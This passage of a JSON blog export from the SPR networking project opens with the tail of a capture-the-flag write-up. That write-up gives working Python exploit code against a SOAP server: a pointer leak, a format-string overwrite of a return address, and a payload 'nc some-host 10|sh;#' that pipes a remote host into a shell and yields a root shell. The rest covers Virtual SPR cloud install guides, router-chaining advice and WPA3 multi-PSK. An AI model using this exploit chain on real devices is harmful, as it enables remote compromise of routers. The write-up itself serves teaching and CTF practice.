final target, we need to exploit an SOAP Server running on the second AP. Our second target box is already authenticated to the AP, so we can easily talk to the server directly.\\n\\nDecompiling the binary, we see that it is a simple HTTP server which implements a few parts of the [SOAP protocol](https://en.wikipedia.org/wiki/SOAP). We can perform a some actions such as listing the server uptime or date.\\n\\nThe first bug I found was in an error handler. This handler uses the `http_response` function to build a response with HTTP code 400. However for the body pointer, it mistakenly passes a `void**` pointer instead of a `char*` ptr. This will leak the address of the `soap_action` function as well as a stack address in the body of the 400 response.\\n```c\\nint __cdecl http_response(...) {\\n  fprintf(stream, \\"HTTP/1.1 %d %s\\\\r\\\\n\\", a2, a3);\\n  fwrite(\\"Server: OS/Version UPnP/1.0 product/version\\", 1u, 0x2Bu, stream);\\n  fwrite(\\"Content-Type: text/html\\\\r\\\\n\\", 1u, 0x19u, stream);\\n  fwrite(\\"Connection: close\\\\r\\\\n\\", 1u, 0x13u, stream);\\n  fwrite(\\"\\\\r\\\\n\\", 1u, 2u, stream);\\n  fprintf(stream, \\"<HTML><HEAD><TITLE>%d %s</TITLE></HEAD>\\\\n<H4>%d %s</H4>\\\\n\\", a2, a3, a2, a3);\\n  ...\\n}\\nunsigned int __cdecl handle_client(int fd) {\\n  void* __soap_action_ = soap_action;\\n  char *v7;\\n  char buf[2048];\\n  v7 = &buf;\\n  if ( _isoc99_sscanf(...) ) {\\n    ...\\n    __soap_action(steam);\\n  } else {\\n    http_response(stream, 400, \\"Invalid request\\", (const char *)&__soap_action_)\\n  }\\n}\\n```\\nWe can trigger this leak with the following code:\\n```python\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.connect((HOST, PORT))\\n\\nsock.sendall(b\'ENDEND a\\\\n\')\\nleak = (sock.recv(4096).split(b\'request</H4>\\\\n\',1)[1]\\n\\t\\t.split(b\'ENDEND\',1)[0].ljust(8,b\'\\\\0\'))\\ntext_leak = u32(leak[:4])\\nstack_leak = u32(leak[4:])\\n\\nsock.close()\\n```\\n\\nLooking closer at the string functions being used, there are several buffer overflows from calls to `sprintf` and `strcpy`. However almost all of these are protected by stack-cookies. Luckily there is a single case where a pointer lays between a buffer and the stack-cookie:\\n\\n```c\\n__int64 __cdecl soap_response(...) {\\n  char dest[2048];\\n  char src[2048];\\n  char* format_str;\\n  unsigned int cookie;\\n  ...\\n  format_str = \\"%s\\";\\n  ...\\n  sprintf(&src[off], \\"%s\\", sub_action);\\n  ...\\n  sprintf(&src[off], format_str, action);\\n}\\n```\\n\\nSince we are able to buffer overflow `src` using the first `sprintf` call, we can smash the `format_str` ptr. This allows point `format_str` at our own data on the stack (using the leak from earlier), giving us an arbitrary [format string vulnerability](https://en.wikipedia.org/wiki/Uncontrolled_format_string).\\n\\nWe can easily exploit the format string by using the `%123$hhn` syntax. This syntax will write the number of bytes printed so far as a `uint8_t` at a given offset on the stack. This is very handy as we can use it to surgically corrupt a return pointer without messing with the stack-cookie.\\n\\nAt this point we can control the EIP register, but we still need to actually get code execution. There is an easy way to do this by abusing the calls to `system` in the binary. We can partially corrupt the return address to point it to the following address in the binary:\\n```\\n.text:00001A76                 call    system\\n.text:00001A7B                 add     esp, 10h\\n.text:00001A7E                 sub     esp, 8\\n```\\nThe first argument of system will be the next value pointed to by ESP, which just so happens to be our format string from before. We can simply prepend our format string exploit with a command to run!\\n\\n```python\\n# Prep return byte overwrite targets\\ng1 = 0x76\\ng2 = ((text_leak & 0xf000) >> 8) + 0xa\\n\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.connect((HOST, PORT))\\n\\npl = b\'post / a\\\\nSOAPAction: \'\\npl += b\'numberwang#wangernum42\'\\n\\n# Place write targets on the stack\\npl += p32(target_stack_ret)\\npl += p32(target_stack_ret+1)\\n# Padding\\npl += b\'EEEE\'\\npl += b\'FFFF\'\\npl += b\'A\'*(1824-4*4)\\n# Smash format ptr\\npl += p32(stack_leak)\\npl += b\'\\\\n\\\\n\'\\n\\n# Command to run in system\\nfmt = \'nc some-host 10|sh;#\'\\n\\n# Format string exploit\\nfmt +=  f\'%{g1-len(fmt)}c\'+\'%592$hhn\'+f\'%{g2-g1}c\'+\'%593$hhn\'\\npl += fmt.encode(\'latin-1\')\\n\\nsock.sendall(pl)\\n```\\n\\nWith this exploit ready to go, we can run it from the second target box. Once the exploit lands we are greeted with our last reverse shell and get the last flag!\\n\\n```\\n$ nc -l 1339 -v\\nListening on 0.0.0.0 1339\\nConnection received on 192.168.1.2 14253\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@21fbbf871fa0:/# cat flag3.txt\\nturtles{c14583540ce6a34f73cb04d964aff18415916fae}\\nroot@21fbbf871fa0:/#\\n```\\n\\n\\n#### Editor\'s note:\\n\\nChallenge 3 is based on a flaw the Supernetworks team exploited in preparation for December\'s pwn2own contest against the Netgear RAX30. Oddly enough: the soapd binary has FORTIFY_SOURCE enabled, yet still has some stray sprintfs, and does in fact store the format string on the stack like that, for unclear reasons."},{"id":"virtual-spr-on-a-gcloud-tier-free-instance","metadata":{"permalink":"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance","source":"@site/blog/2022-10-13-virtual-spr-gcloud.md","title":"Run Virtual SPR on a Google Cloud Free Tier Instance","description":"Introduction","date":"2022-10-13T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"inline":true,"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"inline":true,"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"inline":true,"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"inline":true,"label":"Google Cloud","permalink":"/pages/blog/tags/google-cloud"}],"readingTime":2.495,"hasTruncateMarker":true,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo","page":null}],"frontMatter":{"slug":"virtual-spr-on-a-gcloud-tier-free-instance","title":"Run Virtual SPR on a Google Cloud Free Tier Instance","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","Google Cloud"]},"unlisted":false,"prevItem":{"title":"January 2023\'s Turtles Challenge","permalink":"/pages/blog/january-2023-turtles"},"nextItem":{"title":"Run Virtual SPR on a AWS Micro Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-aws-micro-tier-instance"}},"content":"## Introduction\\n\\nThis guide shows how to setup a new E2 instance in Google Cloud, allow VPN access in firewall and install Virtual SPR.\\nThe result is a private VPN with a custom DNS server able to block ads, log traffic, and more [features](/docs/intro) included in SPR.\\n\\nFor a more general and in-depth guide see the [Virtual SPR Guide](/blog/virtual%20SPR).\\n\\n\x3c!-- truncate --\x3e\\n\\n## Setup Account\\n\\n[Skip](#create-instance) this section if you already have an Google Cloud account & a project setup.\\n\\nGo to [Google Cloud](https://cloud.google.com) & sign in with a Google account, or create a new one and enable Google Cloud.\\nGoogle have a [Free Tier](https://cloud.google.com/free/) where you get $300 in free credits when signing up as a new customer.\\nContinue by creating a Payment Profile.\\n\\nWhen done click **New Project** in the top menu dropdown and pick a name for your project.\\n\\n## Create Instance\\n\\n![](/img/gcloud-1.png)\\n\\nIn the top navigation menu go to **Compute Engine** and click **VM Instances**.\\n\\nClick **Enable** if you haven\'t used the service before. If promped to create a project, pick a name for it & click **Create**.\\n\\nClick **Create Instance**.\\n\\n![](/img/gcloud-2.png)\\n\\nSelect a name for your instance & pick a region.\\n\\nFor Series go with E2 and *Machine type* for the least expensive alternative.\\n\\nUnder *Boot disk* click **Change**:\\n\\n![](/img/gcloud-3.png)\\n\\nSelect and save:\\n* Operating System **Ubuntu**\\n* Version **Ubuntu 22.04 LTS** *x86/64*\\n\\nExpand *Advanced options*, then *Networking*, scroll down to *Network interfaces* and click **default**.\\nSelect *External IPv4 address* and click **Create IP address** to assign a static IP address for your instance.\\n\\n![](/img/gcloud-6.png)\\n\\nThe default settings is fine for the other options.\\nNow click **Create** to boot up the instance.\\n\\n## Firewall rules for VPN access\\n\\nIn the navigation go to **VPC Network** and click **Firewall**. Click **Create Firewall Rule** at the top of the page.\\n\\n![](/img/gcloud-5.png)\\n\\nSettings in screenshot:\\n* Name **allow-wireguard**\\n* Diretion of Traffic **ingress**\\n* Network **default**\\n* Targets **All instances in the network** *all is fine, specify a target if you run more instances*\\n* Source Filter **IP ranges**\\n* Source IP Ranges 0.0.0.0/0 *or if you know the range you will be connecting from*\\n* Protocols and Ports **UDP** and **51280**\\n* Second Source filter **None**\\n\\n*Note: This only allows connections to the instance, WireGuard will authorize clients when connecting*.\\n\\n## Access instance & install SPR\\n\\nYour instance should be available under *Compute Engine* -> *VM Instances*.\\nClick **SSH** in the listing:\\n\\n![](/img/gcloud-4.png)\\n\\nA browser window should popup with a terminal.\\nRun the SPR virtual installer with sudo:\\n\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\n\\nCheck out the source for `virtual_install.sh` [here](https://github.com/spr-networks/super).\\n\\nIf you want to add another device, just run the setup script again:\\n```sh\\ncd super\\nsudo ./virtual_install.sh\\n```\\n\\nNow you have a WireGuard VPN config ready, either scan the QR Code or paste the config into the [WireGuard client](https://www.wireguard.com/install/).\\n\\nFor more information on setting up the client see [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device) on how to connect your VPN client to the instance."},{"id":"virtual-spr-on-a-aws-micro-tier-instance","metadata":{"permalink":"/pages/blog/virtual-spr-on-a-aws-micro-tier-instance","source":"@site/blog/2022-10-07-virtual-spr-aws.md","title":"Run Virtual SPR on a AWS Micro Tier Instance","description":"Introduction","date":"2022-10-07T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"inline":true,"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"inline":true,"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"inline":true,"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"inline":true,"label":"AWS","permalink":"/pages/blog/tags/aws"}],"readingTime":2.13,"hasTruncateMarker":true,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo","page":null}],"frontMatter":{"slug":"virtual-spr-on-a-aws-micro-tier-instance","title":"Run Virtual SPR on a AWS Micro Tier Instance","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","AWS"]},"unlisted":false,"prevItem":{"title":"Run Virtual SPR on a Google Cloud Free Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance"},"nextItem":{"title":"Run Virtual SPR on a DigitalOcean Droplet","permalink":"/pages/blog/virtual-spr-on-a-digital-ocean-droplet"}},"content":"## Introduction\\n\\nThis guide shows how to setup Virtual SPR on a Micro Tier Instance on AWS, and connect to it using WireGuard VPN.\\n\\nThe result is a private VPN with a custom DNS server able to block ads, log traffic, and more features included in SPR.\\n\\nFor a more general and in-depth guide see the [Virtual SPR Guide](/blog/virtual%20SPR).\\n\\n\x3c!-- truncate --\x3e\\n\\n## Create a Instance\\n\\nSign in to [AWS Console](https://console.aws.amazon.com/ec2/home) and navigate to *Instances* in the menu.\\nClick **Launch Instances** for your selected region.\\n\\n![](/img/aws-1.png)\\n\\nName your instance and select Ubuntu and 64-bit (x86) as architecture under OS Images.\\n\\nFor instance type choose any micro tier eligible for free, t2.micro is used in the example.\\n\\n![](/img/aws-2.png)\\n\\nIf you already have a keypair that you want to use, select it under *Key pair* or click **Create new key pair**, save the .pem-file to your ~/.ssh directory and make sure only your user can read it.\\n\\n### Allow VPN access\\n\\nUnder *Network settings* click **Edit** and scroll down to **Add security group rule**.\\nSelect UDP & port 5128, \\"vpn\\" as description and if you want to allow access from a specific source ip or range.\\n\\n![](/img/aws-3.png)\\n\\nClick **Launch Instance** in the bottom right.\\n\\n## Install Virtual SPR\\n\\nNavigate to *Instances*, the newly created instance should be available in the listing and shown as Running, click it.\\nCopy the value under Public IPv4 address and ssh into the box as the ubuntu user:\\n\\n```sh\\nssh -i ~/.ssh/awsspr.pem ubuntu@paste-ipv4-address-here\\n```\\n\\n*NOTE* You can also use the *Instance Connect*-feature if you don\'t have access to a ssh client. Click **Connect** under the *Instance Summary* to get access to a terminal.\\n\\nRun the SPR virtual installer with sudo:\\n\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\n\\n*NOTE: If the script cannot get the public ip address of the instance from one of the network interfaces, it will ask to fetch this from https://ifconfig.me.\\nAnswer yes to fetch this or edit this later (**Endpoint** in the WireGuard config).*\\n\\nThe script will download the [SPR repository](https://github.com/spr-networks/super) and run *virtual_install.sh* (you can also checkout the [repository](https://github.com/spr-networks/super) and run the script manually if you want to inspect the script before running it.)\\n\\nIf you want to add another device, just run the setup script again:\\n```sh\\ncd super\\nsudo ./virtual_install.sh\\n```\\n\\nNow you have a WireGuard VPN config ready, either scan the QR Code or paste the config into the [WireGuard client](https://www.wireguard.com/install/).\\n\\nFor more information on setting up the client see [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device) on how to connect your VPN client to the instance."},{"id":"virtual-spr-on-a-digital-ocean-droplet","metadata":{"permalink":"/pages/blog/virtual-spr-on-a-digital-ocean-droplet","source":"@site/blog/2022-10-03-virtual-spr-do.md","title":"Run Virtual SPR on a DigitalOcean Droplet","description":"Introduction","date":"2022-10-03T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"inline":true,"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"inline":true,"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"inline":true,"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"inline":true,"label":"DigitalOcean","permalink":"/pages/blog/tags/digital-ocean"}],"readingTime":1.335,"hasTruncateMarker":true,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo","page":null}],"frontMatter":{"slug":"virtual-spr-on-a-digital-ocean-droplet","title":"Run Virtual SPR on a DigitalOcean Droplet","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","DigitalOcean"]},"unlisted":false,"prevItem":{"title":"Run Virtual SPR on a AWS Micro Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-aws-micro-tier-instance"},"nextItem":{"title":"SPR in the cloud","permalink":"/pages/blog/virtual SPR"}},"content":"## Introduction\\n\\nThis guide shows how to setup Virtual SPR on a DigitalOcean Droplet and connect to it using WireGuard VPN.\\n\\nFor a more general and in-depth guide see the [Virtual SPR Guide](/blog/virtual%20SPR).\\n\\n\x3c!-- truncate --\x3e\\n\\n## Create a Droplet\\n\\nLogin to [DigitalOcean](https://cloud.digitalocean.com) and click *Create Droplet*.\\n\\n![](/img/cloud-digital-ocean-1.png)\\n\\nSelect prefered Region and Datacenter (*Amsterdam* and *AMS3* in the example),\\ngo with default *Ubuntu 22.04 x64* for OS and version.\\n\\nFor Droplet Size, the smallest *$4/month* Basic with 512 MB RAM is enough but feel free to choose another one.\\n\\n![](/img/cloud-digital-ocean-2.png)\\n\\nIf you already have a ssh key configured for a project you can choose the pubkey or click *New SSH Key* for *Choose Authentication Method*.\\n\\nClick *Create Droplet* & wait for it to spin up.\\n\\n![](/img/cloud-digital-ocean-3.png)\\n\\n## Install Virtual SPR\\n\\nWhen the droplet has started, copy the ipv4 address and ssh into the box using your ssh key as root:\\n```sh\\nssh -i .ssh/id_rsa root@paste-ipv4-address-here\\n```\\n\\nRun the SPR virtual installer as root on the droplet:\\n```sh\\nbash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\nThe script will download the [SPR repository](https://github.com/spr-networks/super) and run *virtual_install.sh* (you can also checkout the [repository](https://github.com/spr-networks/super) and run the script manually if you want to inspect the script before running it.)\\n\\nIf you want to add another device, just run the setup script again:\\n```sh\\ncd super\\n./virtual_install.sh\\n```\\n\\nNow you have a WireGuard VPN config ready, either scan the QR Code or paste the config into the [WireGuard client](https://www.wireguard.com/install/).\\n\\nFor more information on setting up the client see [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device) on how to connect your VPN client to the droplet instance."},{"id":"virtual SPR","metadata":{"permalink":"/pages/blog/virtual SPR","source":"@site/blog/2022-09-07-virtual-spr.md","title":"SPR in the cloud","description":"Introduction","date":"2022-09-07T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"inline":true,"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"inline":true,"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"inline":true,"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"}],"readingTime":3.185,"hasTruncateMarker":true,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo","page":null}],"frontMatter":{"slug":"virtual SPR","title":"SPR in the cloud","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard"]},"unlisted":false,"prevItem":{"title":"Run Virtual SPR on a DigitalOcean Droplet","permalink":"/pages/blog/virtual-spr-on-a-digital-ocean-droplet"},"nextItem":{"title":"Securely Chaining Routers","permalink":"/pages/blog/secure router chaining"}},"content":"## Introduction\\n\\nThis guide will show how to setup virtual SPR and connect to it using a WireGuard VPN client from your phone or desktop computer.\\n\\nThe result is a private VPN with a custom DNS server able to block ads, log traffic, and more.\\n\\n**Quick install**\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\nOpen WireGuard & scan the QR Code/import config - Done!\\n\\n\x3c!-- truncate --\x3e\\n\\n## Virtual SPR Install\\n\\n**What you need**\\n* A linux server running Ubuntu 22.04\\n* If there is a firewall *port 51280/udp* needs to be open for incoming traffic\\n* [WireGuard](https://www.wireguard.com/install/) (*\xa9 Jason A. Donenfeld*) installed on your client phone or desktop\\n\\t* `apt install wireguard` for ubuntu\\n\\t* Official clients for [Windows](https://download.wireguard.com/windows-client/wireguard-installer.exe), [macOS](https://itunes.apple.com/us/app/wireguard/id1451685025?ls=1&mt=12), [iOS](https://itunes.apple.com/us/app/wireguard/id1441195209?ls=1&mt=8), [Android](https://play.google.com/store/apps/details?id=com.wireguard.android)\\n\\n**Run Virtual Installer**\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\n\\n**What the script does**\\n* downloads the latest SPR repository from https://github.com/spr-networks/super/\\n* downloads prebuilt docker images\\n* generate default configs\\n* setup admin password and auth token for API access\\n* start SPR\\n* add a VPN peer and output the WireGuard config\\n\\nYou can also download the script if you want to check it out or add blocklists for ads:\\n```sh\\ncurl -s -O https://raw.githubusercontent.com/spr-networks/super/main/virtual_install.sh\\nchmod +x virtual_install.sh\\nsudo DNS_BLOCK=hosts,ads,tracking,redirects ./virtual_install.sh\\n```\\n\\nSee [here](https://github.com/blocklistproject/Lists) for available blocklists.\\n\\nExample to block DNS requests to adservers and social media:\\n```sh\\nsudo DNS_BLOCK=ads,tracking,facebook,tiktok ./virtual_install.sh\\n````\\n\\nIf you want to change the admin password you can edit the file `configs/base/auth_users.json`\\n\\nRunning the script you should see login info, a QR Code & the WireGuard client config. Example:\\n\\n```sh\\n...\\n[+] WireGuard config: (save this as wg.conf & import in client)\\n----------------------------------------------------------\\n\\n[Interface]\\nPrivateKey = privkey\\nAddress = 192.168.2.94\\nDNS = 192.168.2.1\\n\\n[Peer]\\nPublicKey = pubkey\\nAllowedIPs = 0.0.0.0/0, ::/0\\nEndpoint = 198.211.120.224:51280\\nPersistentKeepalive = 25\\nPresharedKey = psk\\n```\\n\\nIf you want to connect to the VPN using a desktop client, save the config as wg.conf on your local computer.\\n\\n## Configure the VPN client on your device\\n\\n**For iOS and Android**\\n\\nScan the QR Code in the official WireGuard App ([iOS](https://itunes.apple.com/us/app/wireguard/id1441195209?ls=1&mt=8), [Android](https://play.google.com/store/apps/details?id=com.wireguard.android)) to import your VPN profile.\\n\\n**Linux, macOS and Windows**\\n\\nClick *\\"Add empty tunnel...\\"* paste the config and set a name for the tunnel. Or, if you saved the config to a file:\\n\\n* Open your WireGuard client and click *\\"Import tunnel(s) from file\\"*\\n* Select the wg.conf file\\n* Click Activate\\n\\n## Admin interface\\n\\n![](/img/screenshot_login.png)\\n\\nMake sure you\'re connected to the VPN endpoint & browse to http://192.168.2.1 to access the admin interface.\\n\\nLogin using the credentials shown in the output from the script or if you set the password manually (*NOTE* you can check the login info by running `SKIP_VPN=1 ./virtual_install.sh`).\\n\\nIf you prefer to use curl:\\n```sh\\n$ export TOKEN=\\"BASE64-TOKEN-FROM-OUTPUT\\"\\n$ curl -s -H \\"Authorization: Bearer $TOKEN\\" 192.168.2.1/devices\\n```\\n\\nCheckout the [documentation](https://www.supernetworks.org/pages/api/0#section/Introduction) to get started using the SPR API.\\n\\n## Modify Blocklists\\n\\nIn the admin interface you can enable more blocklists by clicking *Blocklists/Ad-block* under DNS:\\n![](/img/screenshot_dns_blocklist.png)\\n\\nSPR comes bundled with the hosts file from https://github.com/StevenBlack/hosts and the blocklists from the https://github.com/blocklistproject/Lists repository, including:\\n*redirect, ads, facebook, twitter, malware, porn, redirect, tracking, youtube, everything*\\n\\nIf something is missing you can always add custom blocklists or block specific domains.\\n\\n## View traffic\\n\\nNavigate to *DNS Log* in the DNS category, select the client to get a log of domains:\\n![](/img/screenshot_dns_log.png)\\n\\nHere you can also add more blocks, domain overrides if you want to allow something temporarily, delete logs or disable them completely under *Settings*.\\n\\nIt is also possible to get more detail traffic for connections under *Traffic*:\\n![](/img/screenshot_traffic.png)\\n\\n## Outro and random notes\\n\\nYou can remove lan from your device groups for a device but its needed to access the admin interface.\\n\\nSPR is configured to use DNS over HTTPs when resolving domains. You can modify the Coredns configuration under configs/dns/Corefile"},{"id":"secure router chaining","metadata":{"permalink":"/pages/blog/secure router chaining","source":"@site/blog/2022-09-03-secure-router-chaining.md","title":"Securely Chaining Routers","description":"Building a Home WiFi Network","date":"2022-09-03T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"Routers","permalink":"/pages/blog/tags/routers"},{"inline":true,"label":"Networking 101","permalink":"/pages/blog/tags/networking-101"}],"readingTime":3.73,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"secure router chaining","title":"Securely Chaining Routers","authors":"ltsrad","tags":["SPR","Routers","Networking 101"]},"unlisted":false,"prevItem":{"title":"SPR in the cloud","permalink":"/pages/blog/virtual SPR"},"nextItem":{"title":"SPR Supports WPA3 with Multiple Passwords","permalink":"/pages/blog/multipsk and wpa3"}},"content":"## Building a Home WiFi Network\\n\\nPutting together a home network has several subtly annoying security tradeoffs.\\n\\n*Users want*\\n- **Ease of Use & Connectivity**\\n\\n  Maximized by keeping devices maximally connected with a simple passphrase\\n\\n- **Privacy and Security**\\n\\n  Maximized by keeping devices minimally connected. And ideally offline  \ud83e\udda6\\n\\nIf the goal is a bit of both, how to do segmentation correctly quickly becomes\\na bit of a puzzle\\n\\n\x3c!-- truncate --\x3e\\n\\n## What\'s the Best Way to Chain Your Routers?\\n\\nThe \\"Secure Router\\" can be considered the Work From Home access point,\\nand the \\"Guest Router\\" can be considered the Guest, Personal, or IOT access point.\\n\\n ![](/img/chaining_choices.png)\\n\\n#### The Worst Choice\\n\\nOption #3 is to connect the internet to the secure router, and then plug the\\nguest router into the secure router. Guests and untrustworthy devices can connect\\nto the guest router.\\n\\nThis might make sense intuitively for some. You put the Secure Router close\\nto the internet since that\'s where all the internet traffic will go out from, and\\nif the Guest Router is compromised, it can\'t intercept traffic.\\n\\nHowever, since the Guest Router is a Peer on the Secure Router network\'s LAN,\\nevery \\"Guest\\" station and the router will be able to reach the secure router and\\ndevices on the secure network LAN.\\n\\nUnless either the Guest Router can block requests to the Secure LAN with its firewall,\\nor the Secure Router can isolate the port for the Guest Router for only internet access,\\nthis is not an accepted best practice.\\n\\n#### Split ESSIDs\\n\\nOption #1 is to share a router for both SSIDs, with one ESSID and password for the\\nSecure LAN and one for the Guest LAN.\\n\\nThe expectation is that devices can not send packets across the two LANs.\\n\\nThe great tradeoff with this is that if a user wants to control their IOT devices\\nthey have to switch to the guest network. And if device isolation is enabled on the guest network,\\ndevices won\'t be able to communicate at all. So as security improves, usability decreases.\\n\\nThe guest isolation may also be insufficient. The shared passphrase implies MITM capabilities,\\nand passive traffic decryption capabilities with WPA2 or active decryption capabilities with WPA3.\\n\\nSome routers place both ESSIDs on the SAME LAN. Usually this allows the secure devices\\nto reach the guest devices. Usability has been increased, but this often leads to subtle flaws\\nthat allow the guest devices to bypass their isolation entirely.\\n\\nAnother upside to this approach is that bandwidth can be shared for the ESSIDs,\\nreducing wasted WiFi spectrum.\\n\\nOverall, this is an accepted best practice, but it comes down to the details where very quickly\\nusers are trading off security for usability.\\n\\n#### The Best of the Three: Guest Router First, Secure Router Second\\n\\nOption #2 is the recommended and accepted best practice. The Guest router connects\\ndirectly to the internet, and the Secure router plugs into the Guest Router.\\n\\nThis approach yields a favorable combination of security and usability. Devices on the\\nsecure LAN can access devices on the Guest LAN, which is great for controlling IOT devices.\\nAnd devices on the Guest LAN have no way to initiate communication to devices on the\\nSecure LAN, blocked by the Secure Router firewall.\\n\\nThe main downsides: The guest router could have ISP credentials, and could MITM\\ninternet traffic if compromised by an untrusted device.\\n\\n### Multi PSK & VLANs\\n\\nToday\'s most featureful home routers offer support for one passphrase per device. This solves\\nmany of the MITM and decryption issues for guest isolation. The devices can be placed into VLANs with unique WiFi passphrases, GTKs, and secure firewall rules creating truly strong isolation. These mechanisms provide powerful mechanisms for designing a home network securely.\\n\\nThis is the approach SPR follows, and we\'ve [spearheaded Multi-PSK with WPA3](/blog/multipsk%20and%20wpa3).\\nSPR provides maximum isolation capabilities by placing each station into its own LAN. Users can then easily\\ncreate groups of interconnected devices.\\n\\n![](/img/tinynets.png)\\n\\n\\n### SPR Supports Plugging into An Existing Router Securely\\n\\nWe recommend running SPR by plugging it into an existing router. To support securely doing this,\\nby default -- the firewall will block access to private network addresses over the upstream interface.\\n\\nThis prevents devices connected to SPR from accessing devices on the LAN of the current router.\\n\\nTo allow a device access to private network addresses upstream, users can apply the `lan_upstream` tag to the device.\\n\\n![](/img/add_wifi_device_lan_upstream.png)\\n\\nAnd then manage the tag in the Devices view\\n\\n![](/img/manage_lan_upstream_tag.png)"},{"id":"multipsk and wpa3","metadata":{"permalink":"/pages/blog/multipsk and wpa3","source":"@site/blog/2022-05-02-wpa3-multipsk.md","title":"SPR Supports WPA3 with Multiple Passwords","description":"SPR\'s WPA3 Multiple Passwords per SSID Surprises People","date":"2022-05-02T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"wifi6","permalink":"/pages/blog/tags/wifi-6"},{"inline":true,"label":"WPA3","permalink":"/pages/blog/tags/wpa-3"},{"inline":true,"label":"PPSK","permalink":"/pages/blog/tags/ppsk"}],"readingTime":1.9,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"multipsk and wpa3","title":"SPR Supports WPA3 with Multiple Passwords","authors":"ltsrad","tags":["SPR","wifi6","WPA3","PPSK"]},"unlisted":false,"prevItem":{"title":"Securely Chaining Routers","permalink":"/pages/blog/secure router chaining"},"nextItem":{"title":"Gigabit WiFi with SPR & The 4x4 MT7915","permalink":"/pages/blog/wifi6"}},"content":"### SPR\'s WPA3 Multiple Passwords per SSID Surprises People\\n\\n WiFi nerds and people working on WiFi products have shared their surprise with me a few times now about the integration for multi-PSK with WPA3. This is something already mostly built into HostAP so it should be possible anywhere, although it is not obvious from the documentation. I\'m told that most other projects simply don\'t do it, putting SPR at the head of the pack! In this post I\'ll share how it\'s integrated, so that others can benefit from the ideas and improve WiFi security for people all around the world.\\n\\n \x3c!-- truncate --\x3e\\n\\n### WPA3 Authentication is Fundamentally Different\\n\\nWPA3 authentication uses [Dragonfly](https://datatracker.ietf.org/doc/html/rfc7664), a Zero-Knowledge Proof in its Simulataneous Authentication of Equals Handshake protocol. With SAE there is nothing to sniff and crack offline from the key exchange. This is in contrast to WPA/WPA2 which is notorious for password cracking of weak passwords from captured handshakes -- or even more conteniently, by using the [RSN IE specification flaw](https://hashcat.net/forum/thread-7717.html).\\n\\nFor Multi-PSK, a router can go down the list of stored PSKs and try each key and see if it had a matching one.\\nFor WPA3, this is not possible. Authenticating a password requires an interactive zero knowledge proof, so a new handshake is required to try a different password.\\n\\n### SPR Uses HostAP\'s MAC Assignment\\n\\nPSKs are assigned by MAC address. HostAP finds the passphrase to use by MAC address to perform the authentication, using the correct PSK the first time around for the interactive proof.\\n\\nThe syntax for hostapd.conf to assign multiple devices is as follows:\\n```\\nsae_password=1stPassphraseHere|mac=01:23:45:67:89:aa\\nsae_password=2ndPassphraseHere|mac=01:23:45:67:89:ab\\n```\\n\\n### Adding Device is Seamless\\n\\nAdding devices is an easy process. If a user does know a MAC address, they can certainly\\nspecify the MAC address ahead of time. However, SPR can use a wildcard MAC to match a new\\nincoming device. When the device authenticates, that PSK will be assigned to the 